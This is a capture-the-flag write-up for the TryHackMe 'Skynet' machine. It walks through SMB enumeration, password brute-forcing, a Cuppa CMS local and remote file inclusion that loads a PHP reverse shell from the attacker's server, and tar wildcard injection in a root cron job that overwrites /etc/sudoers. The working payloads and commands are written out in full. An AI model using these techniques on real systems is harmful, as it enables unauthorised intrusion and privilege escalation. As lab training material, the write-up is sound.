# what I learn
- RFI
- abuse tar wildscard (tar -cf something *)
# enumeration
- 22/tcp  open  ssh
- 80/tcp  open  http
  - /admin (Status: 403)
  - /ai (Status: 403)
  - /config (Status: 403)
  - /css (Status: 403)
  - /index.html (Status: 200)
  - /js (Status: 403)
  - /server-status (Status: 403)
  - /squirrelmail (Status: 200)
    - SquirrelMail version 1.4.23
    - a login page to 
- 110/tcp open  pop3
- 139/tcp open  netbios-ssn
- 143/tcp open  imap
- 445/tcp open  microsoft-ds
```
|   \\10.10.117.118\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.117.118\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
```
let check smb share
```console
kali@kali:~/THM/skynet$ smbclient \\\\$IP\\anonymous
```
get log1.txt and attention.txt
- log1.txt looks like a wordlist
- attention.txt : A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson


# foot hold
let try bruteforce smb share for user `milesdyson` using hydra and `log1.txt` as wordlist:
```console
hydra -f -l milesdyson -P log1.txt -t 64 $IP smb
```
nope no luck... how about `/squirrelmail`. We will use burpsuit to bruteforce it. Capture the request and pass it to Intruder. now add `log1.txt` as the payload and grep match `password incorrect`

it will take a while.. now use milesdyson credential to login to the email server. you will find a mail with subject **Samba Password reset**. here is what contain in the email


```
We have changed your smb password after system malfunction.
Password: <password>
```

now login to Mile smb share. get *important.txt* which tell us about the hidden directory. visit  `http://<ip>/45kra24zxs28v3yd/`. the page dont say much. let `gobuster` and try to find out more


`/45kra24zxs28v3yd/administrator/` is a Cuppa CMS. let search for an exploit.. and I found [this](https://www.exploit-db.com/exploits/25971).


So I try this `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` BAM! LFI works. let use LFI to get user.flag

If you read the exploit, we can also use Remote file inclusion (RFI). Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. In this case we will point/refer to our `php-reverse-shell.php` which is up on our python http server (on kali). 

before executing RFI attack, run netcat and listen for reverse shell. Now visit `alerts/alertConfigField.php?urlConfig=http://<ip>:8000/php-reverse-shell.php`. You should get a reverse shell on netcat directly. now get user flag

# root
Time to root the server. I dont like php shell that much. so I spawn another python shell instead. from python shell I spawn a ptty shell by executing:
```
$ python -c 'import pty; pty.spawn("/bin/sh")'
```
after poking around. I found out that there is a cron job executing `home/milesdyson/backsups.backup.sh` by root user. I planed to just modify the scrip and spawn a reverse shell but we dont have a premission to do so.


Not that in the script, it use `tar *` or what so call wildcars. I have seen some vulnerability which you can abuse wildcards to prive esc (corjob wildcards.). I assume that it should be work with tar too. After some digging I found [DefenseCode_Unix_WildCards_Gone_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt). pls read section.`===[ 4.3 Tar arbitrary command execution` carefuly so you understand what is going on. More over I found [this](https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e) which prove that its work.


as we know, the `backup.sh` will back up everything in `/var/www/html`. To exploit it we need to move to `/var/www/html`
```console
www-data@skynet:~/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
www-data@skynet:~/html$ echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
<o "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"               
www-data@skynet:~/html$ echo "/var/www/html"  > --checkpoint=1
echo "/var/www/html"  > --checkpoint=1
```
the first command we create a `privesc.sh` which will be execute by root (cron job). the script will `echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers` which will give `www-data` a root privilege and aqurie no password to run sudo.

the 2nd and 3rd command you already know by reading the *DefenseCode_Unix_WildCards_Gone_Wild.txt*. Now wait for cron job (1 min). 
```console
www-data@skynet:~/html$ sudo -l
sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
```
BOOM! its works. now get root flag `www-data@skynet:~/html$ sudo cat /root/root.txt`
